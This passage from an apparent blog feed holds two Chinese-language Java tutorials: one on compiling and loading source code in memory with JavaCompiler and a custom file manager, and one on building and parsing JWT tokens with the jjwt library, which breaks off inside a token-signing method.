alt="image-20260112202039305"></p><p>其实<code>SimpleFileObject</code>这个类给我们预留了一个直接获取源代码的方法<code>getCharContent()</code>，不过该方法被设置为抛出异常。当动态编译开始时，程序会优先尝试该方法，若捕获到异常才会去进行url获取</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> CharSequence <span class="title function_">getCharContent</span><span class="params">(<span class="type">boolean</span> ignoreEncodingErrors)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法如何重写？其实只需要返回字符串即可，从<code>SimpleFileObject</code>下的一个默认子类<code>SourceMemoryJavaFileObject</code>重写的<code>getCharContent()</code>也可以看出</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SourceMemoryJavaFileObject</span> <span class="keyword">extends</span> <span class="title class_">MemoryJavaFileObject</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String src;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Object origin;</span><br><span class="line"></span><br><span class="line">        SourceMemoryJavaFileObject(Object origin, String className, String code) &#123;</span><br><span class="line">            <span class="built_in">super</span>(className, JavaFileObject.Kind.SOURCE);</span><br><span class="line">            <span class="built_in">this</span>.origin = origin;</span><br><span class="line">            <span class="built_in">this</span>.src = code;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getOrigin</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> origin;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> CharSequence <span class="title function_">getCharContent</span><span class="params">(<span class="type">boolean</span> ignoreEncodingErrors)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> src;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那我们直接写一个类继承自<code>SimpleJavaFileObject</code>使其<code>getCharContent()</code>返回源代码即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SourceJavaFileObject</span> <span class="keyword">extends</span> <span class="title class_">SimpleJavaFileObject</span> &#123;</span><br><span class="line">        String sourceCode;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">SourceJavaFileObject</span><span class="params">(String name, String sourceCode)</span> <span class="keyword">throws</span> URISyntaxException &#123;</span><br><span class="line">            <span class="built_in">super</span>(URI.create(<span class="string">&quot;string:///&quot;</span> + name.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;/&#x27;</span>) + Kind.SOURCE.extension), Kind.SOURCE);</span><br><span class="line">            <span class="built_in">this</span>.sourceCode = sourceCode;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> CharSequence <span class="title function_">getCharContent</span><span class="params">(<span class="type">boolean</span> ignoreEncoding)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> sourceCode;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在编译任务完成后，<code>call()</code>方法会期望一个字节输出流用于接收编译完成的字节数组，在前面的例子中，该字节输出流指向我们一开始指定的文件地址，而现在需要直接获取输出流，我们可以重写<code>openOutputStream()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassJavaFileObject</span> <span class="keyword">extends</span> <span class="title class_">SimpleJavaFileObject</span> &#123;</span><br><span class="line">        <span class="keyword">static</span> ByteArrayOutputStream outputStream;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">ClassJavaFileObject</span><span class="params">(String className, Kind kind)</span> <span class="keyword">throws</span> URISyntaxException &#123;</span><br><span class="line">            <span class="built_in">super</span>(URI.create(<span class="string">&quot;string:///&quot;</span> + className.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + kind.extension), kind);</span><br><span class="line">            outputStream = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> OutputStream <span class="title function_">openOutputStream</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> outputStream;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getClassBytes() &#123;</span><br><span class="line">            <span class="keyword">return</span> outputStream.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此外，还需要重写<code>StandardJavaFileManager</code>，该类不仅帮助将url资源路径转换为抽象对象，还决定了编译后字节码导出的操作，若不进行重写则该对象仍会尝试将字节码文件写入文件。我们主要重写<code>getJavaFileForOutput()</code>方法用于发送前面构造的<code>ClassJavaFileObjec</code>t和<code>getClassLoader()</code>方法用于返回一个输出字节数组决定的类加载器</p><p>两方法在<code>ForwardingJavaFileManager</code>类内定义，我们继承它即可，因为该类实现了<code>JavaFileManager</code>接口，<code>getTask()</code>方法的参数列表原本就是接收该接口的实现类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">JavaFileManager</span> <span class="keyword">extends</span> <span class="title class_">ForwardingJavaFileManager</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">JavaFileManager</span><span class="params">(StandardJavaFileManager standardFileManager)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(standardFileManager);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> JavaFileObject <span class="title function_">getJavaFileForOutput</span><span class="params">(Location location, String className, JavaFileObject.Kind kind, FileObject sibling)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ClassJavaFileObject</span>(className, kind);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ClassLoader <span class="title function_">getClassLoader</span><span class="params">(Location location)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name)  &#123;</span><br><span class="line">                    <span class="type">byte</span>[] classBytes = ClassJavaFileObject.getClassBytes();</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(name, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>完整的内存内动态编译过程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CompileTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> URISyntaxException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sourceCode</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                  import org.apache.commons.collections.Transformer;</span></span><br><span class="line"><span class="string">                  import org.apache.commons.collections.functors.ConstantTransformer;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                  public class TransformerTest implements CompileTest &#123;</span></span><br><span class="line"><span class="string">                      public void test() &#123;</span></span><br><span class="line"><span class="string">                          Transformer[]  transformers = new Transformer[]&#123;new ConstantTransformer(null)&#125;;</span></span><br><span class="line"><span class="string">                          ConstantTransformer constantTransformer = new ConstantTransformer(transformers);</span></span><br><span class="line"><span class="string">                          System.out.println(constantTransformer.transform(&quot;hello&quot;).toString());</span></span><br><span class="line"><span class="string">                          System.out.println(&quot;hello world&quot;);</span></span><br><span class="line"><span class="string">                      &#125;</span></span><br><span class="line"><span class="string">                  &#125;&quot;&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">SourceJavaFileObject</span> <span class="variable">sourceJavaFileObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SourceJavaFileObject</span>(<span class="string">&quot;TransformerTest&quot;</span>, sourceCode);</span><br><span class="line">        <span class="type">JavaCompiler</span> <span class="variable">compiler</span> <span class="operator">=</span> ToolProvider.getSystemJavaCompiler();</span><br><span class="line">        <span class="type">JavaFileManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaFileManager</span>(compiler.getStandardFileManager(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line">        JavaCompiler.<span class="type">CompilationTask</span> <span class="variable">task</span> <span class="operator">=</span> compiler.getTask(<span class="literal">null</span>, manager, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, List.of(sourceJavaFileObject));</span><br><span class="line">        task.call();</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> manager.getClassLoader(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; transformerTestClass = classLoader.loadClass(<span class="string">&quot;TransformerTest&quot;</span>);</span><br><span class="line">        <span class="type">CompileTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> (CompileTest) transformerTestClass.newInstance();</span><br><span class="line">        transformerTest.test();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其实就改了两个载体一个处理逻辑，<code>SourceJavaFileObject</code>和<code>ClassJavaFileObject</code>保证了将输入的源代码和输出的字节码都保留在内存中，<code>JavaFileManager</code>保证从<code>ClassJavaFileObject</code>获取字节码数据并依此生成类加载器</p><br/>]]></content>
      
      
      <categories>
          
          <category> 零碎 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java后端JWT验证的实现</title>
      <link href="/2026/01/10/Java%E5%90%8E%E7%AB%AFJWT%E9%AA%8C%E8%AF%81%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
      <url>/2026/01/10/Java%E5%90%8E%E7%AB%AFJWT%E9%AA%8C%E8%AF%81%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Java后端JWT验证的实现"><a href="#Java后端JWT验证的实现" class="headerlink" title="Java后端JWT验证的实现"></a>Java后端JWT验证的实现</h1><p>在Java后端中使用JWT令牌验证需要引入三个包</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-jackson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>jjwt-api</code>用于在编译时提供API接口，包含接口、方法等，<code>jjwt-impl</code>在运行时提供默认实现，里面的方法可以被重写，<code>jjwt-jackson</code>用于提供JSON处理器，也可以使用其他JSON库</p><br/><h2 id="基本API"><a href="#基本API" class="headerlink" title="基本API"></a>基本API</h2><h3 id="Claims接口"><a href="#Claims接口" class="headerlink" title="Claims接口"></a>Claims接口</h3><p><code>Claims</code>是JWT的核心载荷，继承于<code>Map&lt;String, Object&gt;</code>泛型集合，其内部有一些默认字段</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ISSUER</span> <span class="operator">=</span> <span class="string">&quot;iss&quot;</span>;  <span class="comment">//签发者，代表签发令牌的机构</span></span><br><span class="line"><span class="type">String</span> <span class="variable">SUBJECT</span> <span class="operator">=</span> <span class="string">&quot;sub&quot;</span>;  <span class="comment">//主题，用于标识JWT的用法什么的</span></span><br><span class="line"><span class="type">String</span> <span class="variable">AUDIENCE</span> <span class="operator">=</span> <span class="string">&quot;aud&quot;</span>;  <span class="comment">//受众，标识该JWT的预期接收对象</span></span><br><span class="line"><span class="type">String</span> <span class="variable">EXPIRATION</span> <span class="operator">=</span> <span class="string">&quot;exp&quot;</span>;  <span class="comment">//过期时间，表明该JWT的有效截止时间</span></span><br><span class="line"><span class="type">String</span> <span class="variable">NOT_BEFORE</span> <span class="operator">=</span> <span class="string">&quot;nbf&quot;</span>;  <span class="comment">//生效时间，JWT在该时间前无效</span></span><br><span class="line"><span class="type">String</span> <span class="variable">ISSUED_AT</span> <span class="operator">=</span> <span class="string">&quot;iat&quot;</span>;  <span class="comment">//签发时间，表示该JWT创建的时间</span></span><br><span class="line"><span class="type">String</span> <span class="variable">ID</span> <span class="operator">=</span> <span class="string">&quot;jti&quot;</span>;  <span class="comment">//JWT ID，表示一个JWT的唯一标识</span></span><br></pre></td></tr></table></figure><p>以上字段在接口内都规定了getter、setter方法</p><h3 id="CompressionCodec接口"><a href="#CompressionCodec接口" class="headerlink" title="CompressionCodec接口"></a>CompressionCodec接口</h3><p>该接口用于规定JWT的压缩与解压方法，以减少 JWT 的总体大小</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] compress(<span class="type">byte</span>[] var1) <span class="keyword">throws</span> CompressionException;</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] decompress(<span class="type">byte</span>[] var1) <span class="keyword">throws</span> CompressionException;</span><br></pre></td></tr></table></figure><h3 id="Header接口"><a href="#Header接口" class="headerlink" title="Header接口"></a>Header接口</h3><p>header是JWT的头部部分，继承于<code>Map&lt;String, Object&gt;</code>泛型集合，可声明JWT的一些元数据、描述</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">JWT_TYPE</span> <span class="operator">=</span> <span class="string">&quot;JWT&quot;</span>;  <span class="comment">//声明JWT类型</span></span><br><span class="line"><span class="type">String</span> <span class="variable">TYPE</span> <span class="operator">=</span> <span class="string">&quot;typ&quot;</span>;  <span class="comment">//令牌类型字段名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">CONTENT_TYPE</span> <span class="operator">=</span> <span class="string">&quot;cty&quot;</span>;  <span class="comment">//内容类型字段名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">COMPRESSION_ALGORITHM</span> <span class="operator">=</span> <span class="string">&quot;zip&quot;</span>;  <span class="comment">//压缩算法字段名</span></span><br></pre></td></tr></table></figure><p>以上字段在接口内都规定了getter、setter方法</p><h3 id="JwtBuilder接口"><a href="#JwtBuilder接口" class="headerlink" title="JwtBuilder接口"></a>JwtBuilder接口</h3><p>该接口规定了构建JWT令牌的核心方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">JwtBuilder</span> <span class="keyword">extends</span> <span class="title class_">ClaimsMutator</span>&lt;JwtBuilder&gt; &#123;</span><br><span class="line">    <span class="comment">//设置JWT头</span></span><br><span class="line">    JwtBuilder <span class="title function_">setHeader</span><span class="params">(Header var1)</span>;</span><br><span class="line"><span class="comment">//由于JWT头本质是一个泛型Map，也支持直接传入Map对象</span></span><br><span class="line">    JwtBuilder <span class="title function_">setHeader</span><span class="params">(Map&lt;String, Object&gt; var1)</span>;</span><br><span class="line"><span class="comment">//像Hearder中添加单个参数</span></span><br><span class="line">    JwtBuilder <span class="title function_">setHeaderParams</span><span class="params">(Map&lt;String, Object&gt; var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtBuilder <span class="title function_">setHeaderParam</span><span class="params">(String var1, Object var2)</span>;</span><br><span class="line"><span class="comment">//直接传入JSON数据的方法，现已很少使用</span></span><br><span class="line">    JwtBuilder <span class="title function_">setPayload</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//设置整体载荷</span></span><br><span class="line">    JwtBuilder <span class="title function_">setClaims</span><span class="params">(Claims var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtBuilder <span class="title function_">setClaims</span><span class="params">(Map&lt;String, ?&gt; var1)</span>;</span><br><span class="line"><span class="comment">//添加自定义载荷字段名</span></span><br><span class="line">    JwtBuilder <span class="title function_">addClaims</span><span class="params">(Map&lt;String, Object&gt; var1)</span>;</span><br><span class="line"><span class="comment">//设置签发者</span></span><br><span class="line">    JwtBuilder <span class="title function_">setIssuer</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//设置主题</span></span><br><span class="line">    JwtBuilder <span class="title function_">setSubject</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//设置目标受众</span></span><br><span class="line">    JwtBuilder <span class="title function_">setAudience</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//设置过期时间</span></span><br><span class="line">    JwtBuilder <span class="title function_">setExpiration</span><span class="params">(Date var1)</span>;</span><br><span class="line"><span class="comment">//设置生效时间</span></span><br><span class="line">    JwtBuilder <span class="title function_">setNotBefore</span><span class="params">(Date var1)</span>;</span><br><span class="line"><span class="comment">//设置签发时间</span></span><br><span class="line">    JwtBuilder <span class="title function_">setIssuedAt</span><span class="params">(Date var1)</span>;</span><br><span class="line"><span class="comment">//设置JWT ID</span></span><br><span class="line">    JwtBuilder <span class="title function_">setId</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtBuilder <span class="title function_">claim</span><span class="params">(String var1, Object var2)</span>;</span><br><span class="line"><span class="comment">//使用传入的key为JWT令牌签名</span></span><br><span class="line">    JwtBuilder <span class="title function_">signWith</span><span class="params">(Key var1)</span> <span class="keyword">throws</span> InvalidKeyException;</span><br><span class="line"><span class="comment">//使用指定的签名算法对密钥进行签名</span></span><br><span class="line">    JwtBuilder <span class="title function_">signWith</span><span class="params">(Key var1, SignatureAlgorithm var2)</span> <span class="keyword">throws</span> InvalidKeyException;</span><br><span class="line"><span class="comment">//使用压缩</span></span><br><span class="line">    JwtBuilder <span class="title function_">compressWith</span><span class="params">(CompressionCodec var1)</span>;</span><br><span class="line"><span class="comment">//自定义Base64编码逻辑</span></span><br><span class="line">    JwtBuilder <span class="title function_">base64UrlEncodeWith</span><span class="params">(Encoder&lt;<span class="type">byte</span>[], String&gt; var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtBuilder <span class="title function_">serializeToJsonWith</span><span class="params">(Serializer&lt;Map&lt;String, ?&gt;&gt; var1)</span>;</span><br><span class="line"><span class="comment">//执行JWT构建，输出JWT字符串</span></span><br><span class="line">    String <span class="title function_">compact</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>claim()</code>方法在默认实现类中的逻辑。若<code>claims</code>字段不存在则新添字段，否则检测<code>value</code>是否为空，为空则删除传入的字段，否则放入字段</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> JwtBuilder <span class="title function_">claim</span><span class="params">(String name, Object value)</span> &#123;</span><br><span class="line">        Assert.hasText(name, <span class="string">&quot;Claim property name cannot be null or empty.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.claims == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.ensureClaims().put(name, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.claims.remove(name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.claims.put(name, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="JwtParserBuilder接口"><a href="#JwtParserBuilder接口" class="headerlink" title="JwtParserBuilder接口"></a>JwtParserBuilder接口</h3><p>该接口规定了解析JWT令牌的核心方法，先前的<code>JwtParser</code>众多方法已被弃用，<code>JwtParserBuilder</code>是其替代方案，该方案强制验证 JWT Claims 中的特定值，不匹配则解析失败</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">JwtParserBuilder</span> &#123;</span><br><span class="line">    <span class="comment">//验证JWT ID</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireId</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//验证主题</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireSubject</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//验证受众</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireAudience</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//验证签发者</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireIssuer</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireIssuedAt</span><span class="params">(Date var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireExpiration</span><span class="params">(Date var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">requireNotBefore</span><span class="params">(Date var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">require</span><span class="params">(String var1, Object var2)</span>;</span><br><span class="line"><span class="comment">//设置参考时钟</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">setClock</span><span class="params">(Clock var1)</span>;</span><br><span class="line"><span class="comment">//设置允许的时间偏差</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">setAllowedClockSkewSeconds</span><span class="params">(<span class="type">long</span> var1)</span> <span class="keyword">throws</span> IllegalArgumentException;</span><br><span class="line"><span class="comment">//设置密钥</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">setSigningKey</span><span class="params">(<span class="type">byte</span>[] var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">setSigningKey</span><span class="params">(String var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">setSigningKey</span><span class="params">(Key var1)</span>;</span><br><span class="line"><span class="comment">//设置动态密钥解析器</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">setSigningKeyResolver</span><span class="params">(SigningKeyResolver var1)</span>;</span><br><span class="line"><span class="comment">//处理压缩的JWT载荷</span></span><br><span class="line">    JwtParserBuilder <span class="title function_">setCompressionCodecResolver</span><span class="params">(CompressionCodecResolver var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">base64UrlDecodeWith</span><span class="params">(Decoder&lt;String, <span class="type">byte</span>[]&gt; var1)</span>;</span><br><span class="line"></span><br><span class="line">    JwtParserBuilder <span class="title function_">deserializeJsonWith</span><span class="params">(Deserializer&lt;Map&lt;String, ?&gt;&gt; var1)</span>;</span><br><span class="line"><span class="comment">//构建解析器</span></span><br><span class="line">    JwtParser <span class="title function_">build</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JwtParser接口"><a href="#JwtParser接口" class="headerlink" title="JwtParser接口"></a>JwtParser接口</h3><p>现在<code>JwtParser</code>一般只用于接收<code>JwtParserBuilder</code>规定的解析规则进行解析操作，不直接参与验证过程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">JwtParser</span> &#123;</span><br><span class="line">    <span class="type">char</span> <span class="variable">SEPARATOR_CHAR</span> <span class="operator">=</span> <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="comment">//检查是否具有签名</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isSigned</span><span class="params">(String var1)</span>;</span><br><span class="line"><span class="comment">//不验证签名返回Jwt对象</span></span><br><span class="line">    Jwt <span class="title function_">parse</span><span class="params">(String var1)</span> <span class="keyword">throws</span> ExpiredJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line"><span class="comment">//使用指定处理器解析</span></span><br><span class="line">    &lt;T&gt; T <span class="title function_">parse</span><span class="params">(String var1, JwtHandler&lt;T&gt; var2)</span> <span class="keyword">throws</span> ExpiredJwtException, UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line"><span class="comment">//解析未签名/不验证签名的纯文本JWT</span></span><br><span class="line">    Jwt&lt;Header, String&gt; <span class="title function_">parsePlaintextJwt</span><span class="params">(String var1)</span> <span class="keyword">throws</span> UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line"><span class="comment">//解析但不验证签名的声明JWT</span></span><br><span class="line">    Jwt&lt;Header, Claims&gt; <span class="title function_">parseClaimsJwt</span><span class="params">(String var1)</span> <span class="keyword">throws</span> ExpiredJwtException, UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line"><span class="comment">//验证签名的纯文本JWS</span></span><br><span class="line">    Jws&lt;String&gt; <span class="title function_">parsePlaintextJws</span><span class="params">(String var1)</span> <span class="keyword">throws</span> UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line"><span class="comment">//验证签名的声明JWS</span></span><br><span class="line">    Jws&lt;Claims&gt; <span class="title function_">parseClaimsJws</span><span class="params">(String var1)</span> <span class="keyword">throws</span> ExpiredJwtException, UnsupportedJwtException, MalformedJwtException, SignatureException, IllegalArgumentException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><p>构造JWT，先使用<code>jjwt-impl</code>自带的<code>Jwts</code>类获取claims</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims();</span><br></pre></td></tr></table></figure><p>放入字段，使用密钥进行签名</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">makeUserToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims().setSubject(<span class="string">&quot;CommonUser&quot;</span>);</span><br><span class="line">        claims.put(<span class="string">&quot;iat&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">        claims.put(<span class="string">&quot;exp&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + EXPIRATION_TIME));</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder().setClaims(claims).signWith(Keys.hmacShaKeyFor(SECRET.getBytes(StandardCharsets.UTF_8))).compact();</span><br><span class="line">    